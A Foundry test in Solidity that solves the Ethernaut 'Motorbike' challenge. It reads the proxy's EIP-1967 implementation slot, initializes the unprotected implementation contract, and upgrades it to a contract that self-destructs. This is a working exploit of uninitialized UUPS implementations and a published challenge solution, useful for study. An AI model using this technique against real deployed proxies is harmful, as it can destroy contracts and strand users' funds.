// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/25-Motorbike/MotorbikeFactory.sol";
import "../src/Ethernaut.sol";

contract TooManyRevs {
    function destroy() external {
        selfdestruct(payable(msg.sender));
    }
}

contract MotorbikeTest is Test {
    Ethernaut ethernaut;
    address playerAddress = address(6529);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(playerAddress, 1 ether);
    }

    function testMotorbike() public {
        // Level Setup
        MotorbikeFactory motorbikeFactory = new MotorbikeFactory();
        ethernaut.registerLevel(motorbikeFactory);
        vm.startPrank(playerAddress);
        address levelAddress = ethernaut.createLevelInstance(motorbikeFactory);
        Motorbike ethernautMotorbike = Motorbike(payable(levelAddress));

        // Level Attack
        // Fetch implementation contract from EIP1967 storage slot https://eips.ethereum.org/EIPS/eip-1967
        bytes32 implementationStored = vm.load(address(ethernautMotorbike), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc);
        emit log_named_bytes32("uint256 implementationAddress", implementationStored);
        address implementationAddress = address(uint160(uint256(implementationStored)));
        emit log_named_address("implementationAddress", implementationAddress);

        Engine engine = Engine(implementationAddress);

        // Selfdestruct implementation contract
        TooManyRevs newEngine = new TooManyRevs();
        engine.initialize();
        engine.upgradeToAndCall(address(newEngine), abi.encodeWithSignature("destroy()"));

        // So... this challenge cannot be tested in Foundry without emulation (setting contract code to "")
        // Until https://github.com/foundry-rs/foundry/issues/1543 is solved

        // Selfdestruct was called, emulate it's behaviour since we cannot validate selfdestructs during tests
        vm.etch(address(engine), "");

        // Level Submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress)); 
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}